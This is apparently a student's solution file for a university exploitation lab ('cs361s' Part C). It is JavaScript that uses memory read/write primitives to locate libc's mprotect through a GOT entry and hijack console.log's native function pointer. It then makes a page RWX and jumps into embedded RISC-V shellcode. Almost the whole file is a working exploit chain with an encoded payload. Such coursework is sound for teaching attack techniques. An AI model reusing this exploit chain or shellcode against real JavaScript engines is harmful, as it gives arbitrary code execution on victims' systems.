/*
 * TODO: Part C solution goes here!
 */
let readmem  = cs361s.readmem;
let writemem = cs361s.writemem;
let addrof   = cs361s.addrof;
let second_stage = 
    "\xb7\x92\x39\x34\x9b\x82\x72\x7b\xb2\x02\x93\x82\xb2\x34\xb6\x02"
  + "\x93\x82\xf2\x22\x23\x3c\x51\xfe\x13\x05\x81\xff\x23\x38\x01\xfe"
  + "\x13\x06\x01\xff\x23\x34\xa1\xfe\x93\x05\x81\xfe\x93\x02\xb0\x03"
  + "\x73\x00\x00\x00";
/* RWX Mapping
 * use mprotect sys call 
 * mark a page on heap as rwx (PROT_READ | PROT_WRITE | PROT_EXEC)
 * hijack console.log
 * write memory to point to mprotect
 * NEED TO FIND WHERE MPROTECT IS
 */
let ctx_offset = 48; // 8 bits
let rt_offset = 24; // 8 bits
// mf = offset 0, 32 bits
let js_malloc_offset = 24;
// ctx->rt->mf.js_malloc_usable_size
let log_addr = addrof(console.log);
let ctx = readmem(log_addr + ctx_offset);
let rt = readmem(ctx + rt_offset);
let mf_js_malloc_offset = readmem(rt + js_malloc_offset);

// auipc offset (top 20 is immediate)
let aupic_offset = readmem(mf_js_malloc_offset) >>> 12 << 12;
// ld offset (top 12 is immediate)
let ld_offset = readmem(mf_js_malloc_offset + 4) >> 20;
// we now have libc pointer to malloc_usable_size
let got_entry = readmem(mf_js_malloc_offset + aupic_offset + ld_offset);
// now get mprotect address
let mprotect_addr = got_entry - 0x31B00; // std offset from malloc to mprotect

/* Populate with Second Stage Payload
 * Either mark the page that holds the second_stage string rwx or 
 * copy the string's contents into the page you have set up.
 * Then jump to the rwx copy of the second-stage payload to execute it.
 * Find where the second stage payload even is
 * look at text segment 
 */
let target = addrof(second_stage);
let c_func_offset = 56;
let old_realm = readmem(log_addr + ctx_offset);
writemem(log_addr + ctx_offset, target); // overwrite realm
writemem(log_addr + c_func_offset, mprotect_addr);
console.log.apply(2.0237e-320, null); // rwx
// Execute Payload
writemem(log_addr + ctx_offset, old_realm); // restore realm
writemem(log_addr + c_func_offset, target + 16); // start of string + 16 HAHAHAHAHHAHAHA
console.log();
